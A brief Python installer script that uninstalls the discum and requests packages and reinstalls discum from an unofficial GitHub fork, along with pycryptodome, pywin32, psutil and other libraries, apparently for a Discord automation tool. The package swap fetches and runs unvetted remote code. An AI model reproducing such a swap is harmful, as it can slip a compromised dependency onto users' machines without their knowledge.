import os
import time
print("When asked to uninstall the modules, type 'y' both times. This installs custom versions of the modules so it needs to rienstall them.")
os.system("pip uninstall discum")
os.system("pip uninstall requests")
os.system("pip install requests")
os.system("python -m pip install --user --upgrade git+https://github.com/DiscordDev3054/Discord-S.C.U.M.git#egg=discum")
os.system("pip install httpx")
os.system("pip install psutil")
os.system("pip install pillow")
os.system("pip install pycryptodome")
os.system("pip install pywin32")
print("Completed installing")
time.sleep(5)
